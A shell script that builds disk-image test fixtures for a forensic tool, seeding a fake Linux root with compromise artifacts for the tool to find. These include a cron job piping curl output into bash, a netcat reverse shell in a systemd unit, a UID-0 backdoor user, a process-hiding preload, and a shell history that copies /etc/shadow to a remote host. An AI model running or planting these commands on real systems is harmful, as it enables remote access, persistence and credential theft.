#!/bin/sh
# Build the disk-image fixtures the disk backend is tested against.
#
# Everything here runs unprivileged: mkfs takes a -d/--rootdir and populates
# the image from a directory, so no loop device and no mount is needed. That
# matters more than convenience - it means the fixtures can be rebuilt on any
# box, by anyone reviewing this, without root.
#
#   sh tools/mkfixtures.sh [outdir]        # default tests/fixtures
#
# On Windows, run it through WSL:
#   wsl -e sh tools/mkfixtures.sh /mnt/c/.../fixtures
#
# What is not built here is built by tools/mkcontainers.py, which wraps the
# raw images produced below in E01, qcow2, vmdk and vhdx - those formats have
# no unprivileged creation tool worth depending on, and writing them in Python
# next to the reader keeps the two definitions of the format in one place.

set -e
OUT=${1:-tests/fixtures}
mkdir -p "$OUT"
WORK=$(mktemp -d)
trap 'rm -rf "$WORK"' EXIT

# xfsprogs and btrfs-progs are not installed on every box and installing them
# needs root. Unpacking the .deb into a directory does not, so if a previous
# run left one at ~/lt/root it is put on the path here - which is how these
# fixtures get built on a workstation the analyst does not administer.
#
#   cd ~/lt && apt-get download xfsprogs btrfs-progs libinih1 liburcu8t64
#   for d in *.deb; do dpkg-deb -x "$d" root; done
if [ -d "$HOME/lt/root" ]; then
    PATH="$HOME/lt/root/usr/sbin:$HOME/lt/root/sbin:$HOME/lt/root/usr/bin:$PATH"
    LD_LIBRARY_PATH="$HOME/lt/root/usr/lib/x86_64-linux-gnu:$HOME/lt/root/lib/x86_64-linux-gnu:$LD_LIBRARY_PATH"
    export PATH LD_LIBRARY_PATH
fi

have() { command -v "$1" >/dev/null 2>&1; }

# ---------------------------------------------------------------------------
# a miniature Linux root, holding one of everything linsight looks for
# ---------------------------------------------------------------------------
ROOTDIR="$WORK/root"
mkdir -p "$ROOTDIR"/etc/ssh "$ROOTDIR"/etc/cron.d "$ROOTDIR"/etc/systemd/system \
         "$ROOTDIR"/var/log/audit "$ROOTDIR"/var/spool/cron/crontabs \
         "$ROOTDIR"/root/.ssh "$ROOTDIR"/home/analyst/.ssh \
         "$ROOTDIR"/usr/bin "$ROOTDIR"/tmp "$ROOTDIR"/dev/shm

cat > "$ROOTDIR/etc/passwd" <<'EOF'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
analyst:x:1000:1000:analyst:/home/analyst:/bin/bash
backup2:x:0:0:backup:/root:/bin/bash
EOF

cat > "$ROOTDIR/etc/group" <<'EOF'
root:x:0:backup2
sudo:x:27:analyst,backup2
docker:x:998:analyst
EOF

cat > "$ROOTDIR/etc/shadow" <<'EOF'
root:$6$rounds=656000$abcdefgh$0123456789:19000:0:99999:7:::
analyst:$6$rounds=656000$ijklmnop$9876543210:19100:0:99999:7:::
backup2::19200:0:99999:7:::
EOF

cat > "$ROOTDIR/etc/hostname" <<'EOF'
web01
EOF

cat > "$ROOTDIR/etc/os-release" <<'EOF'
NAME="Ubuntu"
VERSION="22.04.4 LTS (Jammy Jellyfish)"
ID=ubuntu
VERSION_ID="22.04"
PRETTY_NAME="Ubuntu 22.04.4 LTS"
EOF

cat > "$ROOTDIR/etc/machine-id" <<'EOF'
3f2b9c1d4e5a6b7c8d9e0f1a2b3c4d5e
EOF

cat > "$ROOTDIR/etc/ssh/sshd_config" <<'EOF'
Port 22
PermitRootLogin yes
PasswordAuthentication yes
PermitEmptyPasswords yes
EOF

cat > "$ROOTDIR/etc/crontab" <<'EOF'
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
*/5 *   * * *   root    /dev/shm/.update >/dev/null 2>&1
EOF

cat > "$ROOTDIR/etc/cron.d/sysupdate" <<'EOF'
* * * * * root curl -fsSL http://198.51.100.23/s.sh | bash
EOF

cat > "$ROOTDIR/etc/systemd/system/telemetry.service" <<'EOF'
[Unit]
Description=System Telemetry

[Service]
ExecStart=/usr/bin/nc -e /bin/bash 198.51.100.23 4444
Restart=always

[Install]
WantedBy=multi-user.target
EOF

cat > "$ROOTDIR/etc/ld.so.preload" <<'EOF'
/usr/lib/libprocesshider.so
EOF

cat > "$ROOTDIR/root/.ssh/authorized_keys" <<'EOF'
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7vbqajDhA attacker@kali
EOF

cat > "$ROOTDIR/root/.bash_history" <<'EOF'
wget http://198.51.100.23/linpeas.sh -O /tmp/lp.sh
chmod +x /tmp/lp.sh
./lp.sh
useradd -o -u 0 -g 0 backup2
echo 'root:Passw0rd!' | chpasswd
history -c
EOF

cat > "$ROOTDIR/home/analyst/.bash_history" <<'EOF'
sudo -l
cat /etc/shadow
scp /etc/shadow analyst@203.0.113.9:/tmp/
EOF

# an auth.log with the shapes the parser keys on
cat > "$ROOTDIR/var/log/auth.log" <<'EOF'
Mar 24 22:11:03 web01 sshd[1201]: Failed password for invalid user admin from 203.0.113.9 port 51022 ssh2
Mar 24 22:11:07 web01 sshd[1201]: Failed password for invalid user admin from 203.0.113.9 port 51024 ssh2
Mar 24 22:11:12 web01 sshd[1203]: Failed password for root from 203.0.113.9 port 51030 ssh2
Mar 24 22:14:44 web01 sshd[1240]: Accepted password for root from 203.0.113.9 port 51190 ssh2
Mar 24 22:15:02 web01 sudo:  analyst : TTY=pts/0 ; PWD=/home/analyst ; USER=root ; COMMAND=/bin/bash
Mar 24 22:16:31 web01 useradd[1310]: new user: name=backup2, UID=0, GID=0, home=/root, shell=/bin/bash
Mar 24 22:31:09 web01 sshd[1402]: Accepted publickey for root from 198.51.100.23 port 40122 ssh2: RSA SHA256:abcdef
EOF

cat > "$ROOTDIR/var/log/syslog" <<'EOF'
Mar 24 22:14:59 web01 systemd[1]: Started System Telemetry.
Mar 24 22:33:10 web01 kernel: [ 1201.339] audit: type=1400 apparmor="DENIED" operation="open"
EOF

cat > "$ROOTDIR/var/spool/cron/crontabs/root" <<'EOF'
@reboot /dev/shm/.update
EOF

printf '#!/bin/sh\ncurl -s http://198.51.100.23/p | sh\n' > "$ROOTDIR/dev/shm/.update"
chmod 755 "$ROOTDIR/dev/shm/.update"

# a suid binary in a place one has no business being
printf '\177ELF\002\001\001\000payload-here' > "$ROOTDIR/tmp/.x"
chmod 4755 "$ROOTDIR/tmp/.x" 2>/dev/null || true

# a file big enough to need indirect blocks on ext2/3 and an extent tree on
# ext4 - the two block-mapping paths, exercised by one file
dd if=/dev/urandom of="$ROOTDIR/var/log/big.bin" bs=1K count=6144 status=none

# a directory wide enough to spill past one directory block
mkdir -p "$ROOTDIR/var/log/many"
i=0
while [ $i -lt 400 ]; do
    echo "entry $i" > "$ROOTDIR/var/log/many/logfile-$i.log"
    i=$((i + 1))
done

# symlinks: one short enough to live in the inode, one that needs a block
ln -sf /var/log/auth.log "$ROOTDIR/etc/auth-link"
ln -sf "$(python3 -c 'print("/very/long/path/segment" * 12)')" "$ROOTDIR/etc/long-link" 2>/dev/null || \
    ln -sf /a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/0/1/2/3/4/5/6/7/8/9/aa/bb/cc/dd/ee/ff/gg/hh "$ROOTDIR/etc/long-link"

# a file that is written and then removed, so an ext image carries an inode
# with a deletion time on it - which is the thing the deleted-inode scan finds
# and a mounted filesystem cannot show at all
echo "this file was removed before imaging" > "$ROOTDIR/var/log/removed.log"
DELETED_PATH=/var/log/removed.log

SIZE=192M

mkfs_ext() {
    fs=$1; img=$2; shift 2
    rm -f "$img"
    truncate -s "$SIZE" "$img"
    "mkfs.$fs" -q -F -L linsight -d "$ROOTDIR" "$@" "$img" >/dev/null
    # Unlink one file after the image exists, so it carries an inode with a
    # deletion time and no links - the thing the deleted-inode scan looks for.
    # Deleting it from $ROOTDIR beforehand would just leave it out of the
    # image; debugfs edits the built filesystem, and needs no root to do it.
    if have debugfs; then
        debugfs -w -R "rm $DELETED_PATH" "$img" >/dev/null 2>&1 || true
    fi
    echo "  $img"
}

echo "[*] ext filesystems"
have mkfs.ext4 && mkfs_ext ext4 "$OUT/ext4.img"
have mkfs.ext4 && mkfs_ext ext4 "$OUT/ext4-64bit.img" -O 64bit,metadata_csum
have mkfs.ext3 && mkfs_ext ext3 "$OUT/ext3.img" -O ^extent
have mkfs.ext2 && mkfs_ext ext2 "$OUT/ext2.img" -O ^extent

if have mkfs.xfs; then
    echo "[*] xfs"
    # mkfs.xfs has no --rootdir, but -p takes a proto file that names a source
    # for each regular file - which populates an image with no root and no
    # mount. v5 is the default and what RHEL 7+ ships; v4 is built too,
    # because images of older enterprise hosts are still arriving.
    python3 tools/xfsproto.py "$ROOTDIR" > "$WORK/proto"
    rm -f "$OUT/xfs.img"
    truncate -s 512M "$OUT/xfs.img"
    mkfs.xfs -q -f -L linsight -p "$WORK/proto" "$OUT/xfs.img" >/dev/null
    echo "  $OUT/xfs.img (v5)"
    rm -f "$OUT/xfs-v4.img"
    truncate -s 512M "$OUT/xfs-v4.img"
    if mkfs.xfs -q -f -m crc=0 -L linsight -p "$WORK/proto" "$OUT/xfs-v4.img"             >/dev/null 2>&1; then
        echo "  $OUT/xfs-v4.img (v4, no crc)"
    else
        rm -f "$OUT/xfs-v4.img"
        echo "  (v4 xfs not supported by this mkfs.xfs)"
    fi
    # a 1 KiB-block xfs, so the reader is not silently tied to 4 KiB
    rm -f "$OUT/xfs-1k.img"
    truncate -s 512M "$OUT/xfs-1k.img"
    if mkfs.xfs -q -f -b size=1024 -L linsight -p "$WORK/proto"             "$OUT/xfs-1k.img" >/dev/null 2>&1; then
        echo "  $OUT/xfs-1k.img (1 KiB blocks)"
    else
        rm -f "$OUT/xfs-1k.img"
    fi
fi

if have mkfs.btrfs; then
    echo "[*] btrfs"
    rm -f "$OUT/btrfs.img"
    truncate -s 512M "$OUT/btrfs.img"
    mkfs.btrfs -q -L linsight --rootdir "$ROOTDIR" "$OUT/btrfs.img" >/dev/null
    echo "  $OUT/btrfs.img"
    # and one with compression on, so the extent reader meets a compressed
    # extent rather than assuming every file is stored raw
    rm -f "$OUT/btrfs-zstd.img"
    truncate -s 512M "$OUT/btrfs-zstd.img"
    if mkfs.btrfs -q -L linsight --compress zstd --rootdir "$ROOTDIR"             "$OUT/btrfs-zstd.img" >/dev/null 2>&1; then
        echo "  $OUT/btrfs-zstd.img (zstd)"
    else
        rm -f "$OUT/btrfs-zstd.img"
        echo "  (this mkfs.btrfs cannot compress while building)"
    fi
fi

# ---------------------------------------------------------------------------
# an encrypted volume, which linsight must name rather than pass over
# ---------------------------------------------------------------------------
# luksFormat writes a header to a file and needs no root; it is luksOpen that
# needs device-mapper, and opening it is exactly what linsight does not do.
# The fixture exists to prove the difference between "encrypted, not examined"
# and "nothing here" survives all the way to the report.
if have cryptsetup; then
    echo "[*] luks"
    for ver in 1 2; do
        img="$OUT/luks$ver.img"
        rm -f "$img"
        truncate -s 32M "$img"
        if printf 'linsight-fixture-passphrase' | cryptsetup luksFormat                 --type "luks$ver" --batch-mode --pbkdf pbkdf2                 --pbkdf-force-iterations 1000 "$img" - >/dev/null 2>&1; then
            echo "  $img"
        else
            rm -f "$img"
            echo "  (luks$ver not supported by this cryptsetup)"
        fi
    done
fi

# ---------------------------------------------------------------------------
# partitioned whole-disk images
# ---------------------------------------------------------------------------
if have sfdisk && [ -f "$OUT/ext4.img" ]; then
    echo "[*] partitioned disks"
    # MBR: 1 MiB gap, then the ext4 filesystem as partition 1
    rm -f "$OUT/mbr-ext4.dd"
    truncate -s 200M "$OUT/mbr-ext4.dd"
    printf 'label: dos\nstart=2048, type=83, bootable\n' | \
        sfdisk -q "$OUT/mbr-ext4.dd" >/dev/null
    dd if="$OUT/ext4.img" of="$OUT/mbr-ext4.dd" bs=512 seek=2048 conv=notrunc status=none
    echo "  $OUT/mbr-ext4.dd"

    # GPT: a small boot partition and the root filesystem after it
    rm -f "$OUT/gpt-ext4.dd"
    truncate -s 280M "$OUT/gpt-ext4.dd"
    printf 'label: gpt\nstart=2048, size=32768, type=C12A7328-F81F-11D2-BA4B-00A0C93EC93B, name="EFI"\nstart=34816, type=0FC63DAF-8483-4772-8E79-3D69D8477DE4, name="root"\n' | \
        sfdisk -q "$OUT/gpt-ext4.dd" >/dev/null
    dd if="$OUT/ext4.img" of="$OUT/gpt-ext4.dd" bs=512 seek=34816 conv=notrunc status=none
    echo "  $OUT/gpt-ext4.dd"

    # a disk with one readable filesystem and one encrypted partition beside
    # it: the case where a report must not read as "nothing found"
    if [ -f "$OUT/luks1.img" ]; then
        rm -f "$OUT/gpt-luks.dd"
        truncate -s 320M "$OUT/gpt-luks.dd"
        printf 'label: gpt
start=2048, size=65536, type=CA7D7CCB-63ED-4C53-861C-1742536059CC, name="crypt"
start=67584, type=0FC63DAF-8483-4772-8E79-3D69D8477DE4, name="root"
' |             sfdisk -q "$OUT/gpt-luks.dd" >/dev/null
        dd if="$OUT/luks1.img" of="$OUT/gpt-luks.dd" bs=512 seek=2048             conv=notrunc status=none
        dd if="$OUT/ext4.img" of="$OUT/gpt-luks.dd" bs=512 seek=67584             conv=notrunc status=none
        echo "  $OUT/gpt-luks.dd"
    fi

    # split raw, the way an imager writes to FAT32
    rm -f "$OUT"/split.dd.00*
    split -b 64M -d -a 3 "$OUT/mbr-ext4.dd" "$OUT/split.dd."
    echo "  $OUT/split.dd.000 (+ segments)"
fi

echo "[+] fixtures in $OUT"
ls -la "$OUT" | tail -n +2
